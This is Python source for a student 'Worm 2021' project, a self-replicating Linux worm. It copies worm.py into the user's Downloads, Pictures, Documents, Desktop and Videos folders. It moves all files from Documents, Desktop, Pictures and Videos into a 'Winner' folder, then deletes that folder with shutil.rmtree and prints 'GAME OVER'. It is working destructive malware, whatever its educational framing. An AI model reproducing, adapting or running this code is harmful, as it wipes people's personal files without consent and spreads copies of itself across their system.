#The Beginning

# Worm 2021 Project By Mia Jenkins and Mentored by Deep Ramanayake

#import modules
import sys #allows for command line and creating files 
import os #allows us access for command line as well but more clear
import glob #helps with replication process and path finding 
#import nmap #should allow me to pull from the nmap; may not use
import socket #should allow me to pull the ip address of the host machine of the virus
import platform #gives me system info
from sys import argv #uses arguments 
import subprocess #allows you to use terminal commands 
import shutil #file moving

def wiggle():
    #the purpose of this function is to allow the worm to move and find files

    #first check the OS
    system = platform.system()

    #the computer is linux 
    if(system == "Linux"):
        #get the current location
        #currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3

        #need the username to properly get pathway names
        username = os.getlogin()

        #if the worm is in Downloads
        if(os.path.isdir("/home/"+username+"/Downloads/") == True):
            #we go to that directory

            location = "/home/"+username+"/Downloads"

            #changes directory
            os.chdir(location)

            #make a copy of the folder that holds the worm in it 
            copy()

            #I send it to another location

        #if the worm is in pictures
        if(os.path.isdir("/home/"+username+"/Pictures/") == True):

            #we go to that directory
            location2 = "/home/"+username+"/Pictures"
            os.chdir(location2)
            #make a copy of the folder that holds the worm in it 
            copyfile()

        #send it to documents
        if(os.path.isdir("/home/"+username+"/Documents/") == True):
            location3 = "/home/"+username+"/Documents/"
            os.chdir(location3)
            copyfile()
        
        #send it to Desktop
        if(os.path.isdir("/home/"+username+"/Desktop/") == True):
            location4 = "/home/"+username+"/Desktop/"
            os.chdir(location4)
            copyfile()

        #send it to videos
        if(os.path.isdir("/home/"+username+"/Videos/") == True):
            location5 = "/home/"+username+"/Videos/"
            os.chdir(location5)
            copyfile()

def copy():

    #code begins the copy function of the worm which allows it to replicate on the users computer

    #began the worm copy method
    script = argv

    #setting this to a name 
    name = str(script[0])

    #going to create the directory twice
    for i in range(0,1):
        directoryName = 'You Lose' 
        subprocess.call(['mkdir', directoryName])
        subprocess.call(['cp',name, directoryName])

def copyfile():
    #just copies the worm.py file to get rid of current issue

    #worm location -- issue that this is hard coded and only works if the file is in the downloads
    username = os.getlogin()

    wormie = "/home/" + username + "/Downloads/worm.py"

    #now you need to copy the worm file
    shutil.copy(wormie, os.getcwd())
    
def take():
    #the take method will create a file and send all the other files in that folder

    #get the username
    username = os.getlogin()

    #first we change directories
    #os.chdir needs a path so we manully set one
    location = "/home/"+username+"/Documents"
    os.chdir(location)

    #create the folder in that location there??
    directory = 'Winner'
    subprocess.call(['mkdir', directory]) #this is my destination file

    #copy all of the files in that directory

    #i need to list all of the folder in a
    files = os.listdir("/home/"+username+"/Documents")
    #then loop through all of those files
    for filename in files:
        #want to make the files a full pathway to properly copy
        full_name = os.path.join("/home/"+username+"/Documents", filename)
        if os.path.isfile(full_name):

            #send all of those copies to a new file 
            shutil.move(full_name, directory)
    
    #send it to Desktop
    files2 = os.listdir("/home/"+username+"/Desktop")
    #then loop through all of those files
    for filename2 in files2:
        full_name2 = os.path.join("/home/"+username+"/Desktop", filename2)
        if os.path.isfile(full_name2): 
            shutil.move(full_name2, directory)

    #send it to Pictures
    files4 = os.listdir("/home/"+username+"/Pictures")
    #then loop through all of those files
    for filename4 in files4:
        full_name4 = os.path.join("/home/"+username+"/Pictures", filename4)
        if os.path.isfile(full_name4): 
            shutil.move(full_name4, directory)
    
    #send it to videos
    files5 = os.listdir("/home/"+username+"/Videos")
    #then loop through all of those files
    for filename5 in files5:
        full_name5 = os.path.join("/home/"+username+"/Videos", filename5)
        if os.path.isfile(full_name5): 
            shutil.move(full_name5, directory)
       
def delete():
    #this will allow me to delete a the Winner file. I put it in a seperate method to make sure that it will delete when the method calls for it and not randomly while the take() 
    #method is still running
    
    #need to find the directory that the Winner folder is in first -- should be in documents

    #get username for the proper pathway creation
    username = os.getlogin()

    #now delete that pathway using shutil
    shutil.rmtree('/home/' + username + '/Documents/Winner', ignore_errors= True)

    #ignoring the errors will allow anything to be removed regardless of read only file status
    
def main():
    print("NOW STARTING")
    #copy()
    take()
    wiggle()
    delete()
    print("GAME OVER")

if __name__ == "__main__":
    main()


# The End 